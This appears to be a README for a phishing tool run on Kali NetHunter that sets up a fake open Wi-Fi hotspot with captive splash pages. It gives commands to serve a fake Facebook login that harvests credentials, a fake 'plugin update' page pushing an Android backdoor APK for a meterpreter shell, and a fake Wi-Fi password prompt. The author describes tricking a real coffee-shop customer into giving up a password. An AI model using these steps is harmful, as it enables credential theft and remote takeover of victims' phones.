**NB:** I made this basic script and tested it on Kali Nethunter.<br />
You don't need a second wireless interface or monitor mode. wlan0 is enough. <br />
# 1. **Scenario 1: facebook phishing**
<img src="images/facebook.jpg" width="200">
    Turn your smart phone's wifi Hotspot on and create an OPEN wireless hotspot (no password).<br />
    Open a terminal in kali nethunter and type: <br />
    chmod +x hsp.sh && ./hsp.sh <br />
    Open a second terminal and type: <br />
    ifconfig (check your ip, usually 192.168.43.1) <br />
    cd /var/www/html/facebook/ && php -S 192.168.43.1:8080 <br />
As soon as you connect to the fake hotspot, a splash screen opens automatically asking for facebook credentials.<br />

# 2. **Scenario 2: fake plugin update with android APK**
<img src="images/backdoor.jpg" width="200">
    Create an android payload (update.apk). <br />
    Put the update.apk file in "backdoor" folder after you unzip it.<br />
    Open a terminal and type:<br />
    cd /var/www/html/backdoor/ && php -S 192.168.43.1:8080 <br />
    Open a second terminal and type ./hsp.sh <br />
When the victim connects to the fake hotspot, he will get a splash screen asking him to download a necessary plugin update (update.apk) <br />
If he installs the apk, you'll get a meterpreter shell. <br />

# 3. **Scenario 3: Wifi Password Pop up**

<img src="images/wifi.jpg" width="200">
In this scenario, you can name your hotspot the same name as any wifi network around you, and if the victim connects to it by mistake, he's greeted with a pop up login box that asks for the wifi password.<br />
I tried this in a coffee shop and it worked great. Some customers knew the wifi password of the coffee shop but I didn't know it, and one of the customers fell for the trick and gave me the password without knowing it. <br />

**ALL SCENARIOS WORK PERFECTLY USING MY NEXUS 5 KALI NETHUNTER.**

You can access the logged credentials in the browser. Just type:<br />
**http://192.168.43.1:8080/logger.html** <br />

# **The other scenarios: instagram, messenger (etc...) don't need to be explained.** 
          
